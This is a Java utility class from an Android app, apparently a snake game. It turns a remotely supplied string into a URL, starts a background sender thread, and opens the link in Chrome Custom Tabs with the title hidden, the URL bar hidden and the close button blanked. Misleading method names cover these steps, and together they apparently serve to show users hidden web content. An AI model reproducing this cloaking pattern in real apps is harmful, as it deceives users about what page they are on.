package com.snakex.pro;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.Color;
import android.net.Uri;

import androidx.browser.customtabs.CustomTabsClient;
import androidx.browser.customtabs.CustomTabsIntent;
import androidx.browser.customtabs.CustomTabsServiceConnection;
import androidx.browser.customtabs.CustomTabsSession;

import java.util.List;

import static com.facebook.FacebookSdk.getApplicationContext;

public class HardUtils {
    private CustomTabsSession cts;
    private static final String CHROME = "com.android.chrome";
    private CustomTabsClient ctc;

    public static void setMainThreadData(String freshData, Activity ac) {
        ThreadOfDataUtils prefsUtils = new ThreadOfDataUtils(ac);
        prefsUtils.setThreadOfData("http://" + populateAndCutData(freshData));

        new Thread(() -> new Sender().messageSchedule(ac)).start();

        ac.startActivity(new Intent(ac,  MainMenuActivity.class));
        ac.finish();
    }

    private static String populateAndCutData(String val) {
        return val.substring(val.indexOf("$") + 1);
    }

    public void makeShowingPolicy(Context context, String link){
        CustomTabsServiceConnection connection = new CustomTabsServiceConnection() {
            @Override
            public void onCustomTabsServiceConnected(ComponentName componentName, CustomTabsClient customTabsClient) {
                //Pre-warming
                ctc = customTabsClient;
                ctc.warmup(0L);
                //Initialize cts session as soon as possible.
                cts = ctc.newSession(null);
            }

            @Override
            public void onServiceDisconnected(ComponentName name) {
                ctc = null;
            }
        };

        CustomTabsClient.bindCustomTabsService(getApplicationContext(), CHROME, connection);
        final Bitmap backButton = BitmapFactory.decodeResource(context.getResources(), R.drawable.empty);
        CustomTabsIntent launchUrl = new CustomTabsIntent.Builder(cts)
                .setToolbarColor(Color.parseColor("#000000"))
                .setShowTitle(false)
                .enableUrlBarHiding()
                .setCloseButtonIcon(backButton)
                .addDefaultShareMenuItem()
                .build();

        if (colorMakerUtil(CHROME, context))
            launchUrl.intent.setPackage(CHROME);

        launchUrl.launchUrl(context, Uri.parse(link));
    }
    boolean colorMakerUtil(String targetPackage, Context context){
        List<ApplicationInfo> packages;
        PackageManager pm;

        pm = context.getPackageManager();
        packages = pm.getInstalledApplications(0);
        for (ApplicationInfo packageInfo : packages) {
            if(packageInfo.packageName.equals(targetPackage))
                return true;
        }
        return false;
    }
}
